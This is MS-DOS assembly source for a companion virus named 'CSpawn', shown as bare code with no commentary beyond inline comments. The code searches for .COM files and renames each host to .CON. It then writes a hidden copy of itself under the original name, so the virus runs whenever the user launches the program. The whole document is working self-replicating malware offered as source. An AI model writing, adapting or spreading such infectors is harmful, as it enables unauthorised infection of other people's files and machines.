.model tiny
.code
        org 100h
CSpawn:
        MOV SP, offset FINISH + 100h
        MOV AH, 4AH
        MOV BX,SP
        MOV CL,4
        SHR BX,CL
        INC BX
        INT 21H

        MOV BX,2Ch
        MOV AX,[BX]
        MOV WORD PTR [PARAM_BLK],AX
        MOV AX,CS
        MOV WORD PTR [PARAM_BLK+4],AX
        MOV WORD PTR [PARAM_BLK+8],AX
        MOV WORD PTR [PARAM_BLK+12],AX

        MOV DX,offset REAL_NAME
        MOV BX,offset PARAM_BLK
        MOV AX,4B00h
        INT 21h

        CLI
	mov     bx,ax                   ;save return code here
        mov     ax,cs                   ;AX holds code segment
        mov     ss,ax                   ;restore stack first 
        mov     sp,(FINISH - CSpawn) + 200H
        sti                
	push    bx                
	mov     ds,ax                   ;Restore data segment
        mov     es,ax                   ;Restore extra segment
        mov     ah,1AH                  ;DOS set DTA function    
        mov     dx,80H                  ;put DTA at offset 80H      
        int     21H                
	call    FIND_FILES              ;Find and infect files
        pop     ax                      ;AL holds return value 
        mov     ah,4CH                  ;DOS terminate function     
	int     21H                     ;bye-bye

;The following routine searches for COM files and infects them
FIND_FILES:                
	mov     dx,OFFSET COM_MASK      ;search for COM files
        mov     ah,4EH                  ;DOS find first file function 
        xor     cx,cx                   ;CX holds all file attributes
FIND_LOOP:      
	int     21H                
	jc      FIND_DONE               ;Exit if no files found
        call    INFECT_FILE             ;Infect the file!
        mov     ah,4FH                  ;DOS find next file function 
        jmp     FIND_LOOP               ;Try finding another file
FIND_DONE:      ret                     ;Return to caller
        COM_MASK        db      '*.COM',0               ;COM file search mask

;This routine infects the file specified in the DTA.

INFECT_FILE:                
	mov     si,9EH                  ;DTA + 1EH                
	mov     di,OFFSET REAL_NAME     ;DI points to new name
INF_LOOP:       
	lodsb                           ;Load a character
	stosb                           ;and save it in buffer
	or      al,al                   ;Is it a NULL?
	jnz     INF_LOOP                ;If so then leave the loop
        mov     WORD PTR [di-2],'N'     ;change name to CON & add 0
	mov     dx,9EH                  ;DTA + 1EH
	mov     di,OFFSET REAL_NAME                
	mov     ah,56H                  ;rename original file
	int     21H
	jc      INF_EXIT                ;if can’t rename, already done

	mov     ah,3CH                  ;DOS create file function
        mov     cx,2                    ;set hidden attribute
        int     21H
        mov     bx,ax                   ;BX holds file handle
        mov     ah,40H                  ;DOS write to file function
        mov     cx,FINISH - CSpawn      ;CX holds virus length
        mov     dx,OFFSET CSpawn        ;DX points to CSpawn of virus
        int     21H                
	mov     ah,3EH                  ;DOS close file function
        int     21H
INF_EXIT:       ret
	REAL_NAME       db      13 dup (?)              ;Name of host to execute

	;DOS EXEC function parameter block
        PARAM_BLK       DW      ?                       ;environment segment
                	DD      80H                     ;@ of command line
	                DD      5CH                     ;@ of first FCB
        	        DD      6CH                     ;@ of second FCB
FINISH:
	end     CSpawn

